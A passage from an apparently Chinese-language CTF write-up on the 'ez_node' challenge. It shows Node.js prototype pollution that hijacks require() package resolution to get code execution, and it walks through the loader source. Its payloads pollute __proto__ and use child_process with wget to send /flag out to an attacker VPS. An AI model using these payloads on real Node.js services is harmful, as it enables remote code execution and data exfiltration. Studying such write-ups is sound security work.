class="attr">&quot;npm_config_global&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;npm_execpath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;--eval=require(&#x27;child_process&#x27;).execFile(&#x27;sh&#x27;,[&#x27;-c&#x27;,&#x27;wget\thttp://vpsip:vpsport/`cat /flag`&#x27;])&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就可以得到flag</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302111635764.png" title="image-20230211163541731" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302111635764.png" alt="image-20230211163541731"></a></p>
+<p>至于这个exp是在哪找到的，就是题目给了hint:<code>ez_node: https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454</code></p>
+<p>在github上直接搜就可以找到 :&gt;</p>
+<p>更加精细的文章可以看</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/aszx87410/huli-blog/blob/4c424f193ce7fe7e8468c950d22fe5cbabdc1b29/source/_posts/ctf-js-notes.md">huli老师的文章</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://hujiekang.top/2022/10/11/NodeJS-require-RCE/">Node.js require() RCE复现</a></p>
+</li>
+</ul>
+<hr>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a><strong>补充</strong></h2><p>在看了<a target="_blank" rel="noopener" href="https://hujiekang.top/2022/10/11/NodeJS-require-RCE/">Node.js require() RCE复现</a>这篇文章以及本地调试后，大概知道是啥原理了</p>
+<p>主要是在<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454">https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454</a>里的</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="attr">data</span>: pkg, <span class="attr">path</span>: pkgPath &#125; = <span class="title function_">readPackageScope</span>(parentPath) || &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>readPackageScope()</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">readPackageScope</span>(<span class="params">checkPath</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> rootSeparatorIndex = <span class="title class_">StringPrototypeIndexOf</span>(checkPath, sep);</span><br><span class="line">  <span class="keyword">let</span> separatorIndex;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    separatorIndex = <span class="title class_">StringPrototypeLastIndexOf</span>(checkPath, sep);</span><br><span class="line">    checkPath = <span class="title class_">StringPrototypeSlice</span>(checkPath, <span class="number">0</span>, separatorIndex);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">StringPrototypeEndsWith</span>(checkPath, sep + <span class="string">&#x27;node_modules&#x27;</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> pjson = <span class="title function_">readPackage</span>(checkPath + sep);</span><br><span class="line">    <span class="keyword">if</span> (pjson) <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">data</span>: pjson,</span><br><span class="line">      <span class="attr">path</span>: checkPath,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125; <span class="keyword">while</span> (separatorIndex &gt; rootSeparatorIndex);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在进入<code>readPackage()</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">readPackage</span>(<span class="params">requestPath</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> jsonPath = path.<span class="title function_">resolve</span>(requestPath, <span class="string">&#x27;package.json&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> existing = packageJsonCache.<span class="title function_">get</span>(jsonPath);</span><br><span class="line">  <span class="keyword">if</span> (existing !== <span class="literal">undefined</span>) <span class="keyword">return</span> existing;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result = packageJsonReader.<span class="title function_">read</span>(jsonPath);</span><br><span class="line">  <span class="keyword">const</span> json = result.<span class="property">containsKeys</span> === <span class="literal">false</span> ? <span class="string">&#x27;&#123;&#125;&#x27;</span> : result.<span class="property">string</span>;</span><br><span class="line">  <span class="keyword">if</span> (json === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    packageJsonCache.<span class="title function_">set</span>(jsonPath, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> parsed = <span class="title class_">JSON</span>Parse(json);</span><br><span class="line">    <span class="keyword">const</span> filtered = &#123;</span><br><span class="line">      <span class="attr">name</span>: parsed.<span class="property">name</span>,</span><br><span class="line">      <span class="attr">main</span>: parsed.<span class="property">main</span>,</span><br><span class="line">      <span class="attr">exports</span>: parsed.<span class="property">exports</span>,</span><br><span class="line">      <span class="attr">imports</span>: parsed.<span class="property">imports</span>,</span><br><span class="line">      <span class="attr">type</span>: parsed.<span class="property">type</span></span><br><span class="line">    &#125;;</span><br><span class="line">    packageJsonCache.<span class="title function_">set</span>(jsonPath, filtered);</span><br><span class="line">    <span class="keyword">return</span> filtered;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    e.<span class="property">path</span> = jsonPath;</span><br><span class="line">    e.<span class="property">message</span> = <span class="string">&#x27;Error parsing &#x27;</span> + jsonPath + <span class="string">&#x27;: &#x27;</span> + e.<span class="property">message</span>;</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他会对当前require请求文件所在的目录中区找package.json文件并进行json解析，如果没有就返回fasle</p>
+<p>所以</p>
+<p><code>const &#123; data: pkg, path: pkgPath &#125; = readPackageScope(parentPath) || &#123;&#125;</code>对pkg赋值的肯定是后面的<code>&#123;&#125;</code>的值</p>
+<p>而这里就可以对pkg和pkgPath的值进行污染</p>
+<p>总结来说，在require<strong>非原生库</strong>的过程中，最终会去调用<code>PkgPath</code>和<code>pkg.exports</code>拼接起来的字符串所指定的文件</p>
+<p>所以payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./err.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;exports&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./&lt;需要调用文件的文件名&gt;&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;需要调用的文件的路径&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果要使用题目中提供的文件上传功能的话，就是这样做的</p>
+<p>众所周知，require得到的是module.exports的内容，所以先上传一个js文件</p>
+<p>好像是没有curl这个命令，所以这里要用wget进行oob</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obj=&#123;</span><br><span class="line">    <span class="attr">getRandomErr</span>:<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>）.<span class="title function_">execSync</span>(<span class="string">&#x27;wget http://vpsport:vpsport/`cat /flag`&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>=obj</span><br></pre></td></tr></table></figure>
+
+<p>得到上传后的文件名</p>
+<p>payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./err.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;exports&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./cc3ddcac43eb509d0d8df23e0a6fc124.js&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/app/upload&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>给&#x2F;pollution路由传数据，然后就可以在vps上得到flag</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302121716520.png" title="image-20230212171612402" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302121716520.png" alt="image-20230212171612402"></a></p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/nodejs/'>
+                            nodejs
+                        </a>
+                    
+                        <a href='/tags/php/'>
+                            php
+                        </a>
+                    
+                        <a href='/tags/CTF/'>
+                            CTF
+                        </a>
+                    
+                        <a href='/tags/go/'>
+                            go
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/WP/'>
+                            WP
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
